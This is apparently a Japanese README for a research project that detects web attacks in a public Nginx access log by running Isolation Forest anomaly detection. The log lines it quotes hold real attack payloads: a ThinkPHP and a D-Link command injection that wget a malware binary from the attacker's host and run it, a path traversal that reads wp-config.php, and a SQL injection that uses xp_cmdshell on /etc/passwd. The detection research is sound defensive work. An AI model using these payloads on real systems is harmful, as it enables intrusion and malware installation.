# Walu(Web Application Log Unveiler)

https://www.scutum.jp/information/waf_tech_blog/2021/01/waf-blog-077.html
 
　上記Blog（WAF Tech Blog）から自分なりに調査した結果のメモ。

　ラベル付け無しに攻撃を検知したい。そのためには正常系から離れたデータ、つまり「外れ値」を攻撃と定義して、異常検知アルゴリズムを用いる。上記blogではIsolation forestを使用。データセットは[Harvard Dataverse](https://dataverse.harvard.edu/dataset.xhtml?persistentId=doi:10.7910/DVN/3QBYB5)にあるAccess.log.zip。イラン実在のショッピングサイトにおける2019年1月からの数日間のアクセスログをNginxにより取得。1036万行（3.3GB）。

　上記blogと同条件で取り出したデータから、ランダムに抽出した10000件のデータを2次元にマッピング（画像1）。データセットを調査するとScale-freeしている。[ipynb/viz01.ipynb](ipynb/viz01.ipynb) [[mybinder.org](https://mybinder.org/v2/gh/kenjiaiko/Walu/main?filepath=ipynb%2Fviz01.ipynb)]

<img src="ipynb/t-SNE10000.jpg" width="300">（画像1）

　異常検知において正常系と判断されるのは大きなクラスタ、よって小さいクラスタ群が外れ値となる。データセットがScale-freeしているため外れ値となったクラスタ群を集めて再度Isolation forestを適用すれば、さらなる外れ値が算出される。スコアの閾値を0.25にし、2回Isolation forestを適用すると

```
$ ./run.sh 2 0.25
```

```
$ head -n 2 data/result_by_ip.txt
0.186 185.222.202.118 - - [22/Jan/2019:09:15:46 +0330] "GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://185.222.202.118/bins/rift.x86;cat%20rift.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp HTTP/1.1" 301 178 "-" "python-requests/2.4.3 CPython/2.7.9 Linux/3.16.0-4-amd64" "-"
0.188 62.210.157.10 - - [25/Jan/2019:21:20:36 +0330] "GET /wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../wp-config.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" "-"
```

　1,2行目に明確な攻撃がくる。61,62行目にはSELECT,UNIONを含んだもの。

```
0.261 176.121.14.183 - - [25/Jan/2019:12:07:57 +0330] "GET /image/29000?name=6aba3c.jpg&amp%3Bwh=200x200&HMCj%3D1300%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 1035 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4) Gecko/2008031317 Firefox/3.0b4" "-"
0.261 5.101.40.234 - - [23/Jan/2019:06:53:01 +0330] "GET /image/{{basketItem.id}}?type=productModel&wh=50x50&fhnz%3D1551%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24" "-"
```

　次に専門家による特徴選択をしないケース。例えば特定の文字（Char）のCountのみを特徴とする場合。

```
$ python printspchars.py > features.txt
$ ./run.sh 2 0.30
```

　先頭から怪しいアクセスは続くが、明確なのは11行目以降。
 
```
0.204 108.61.86.94 - - [24/Jan/2019:13:08:01 +0330] "GET /login.cgi?cli=aa%20aa%27;wget%20http://108.61.86.94/bins/Solstice.mips%20-O%20->%20/tmp/.Solstice;chmod%20777%20/tmp/.Solstice;/tmp/.Solstice%20dlink%27$ HTTP/1.1" 400 166 "-" "Solstice/2.0" "-"
```

　それなりには攻撃アクセスが上位（低いスコア）になっている。ただし、先ほど2行目にあったアクセスは、こちらでは107行目：スコア0.344とかなり遅い登場。

```
0.344 62.210.157.10 - - [25/Jan/2019:21:20:36 +0330] "GET /wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../wp-config.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" "-"
```

　当然、専門家が特徴を設定した方が良いが、適当な特徴でもそれなりに（分析には差し障りない程度に）良い結果が得られるようである。
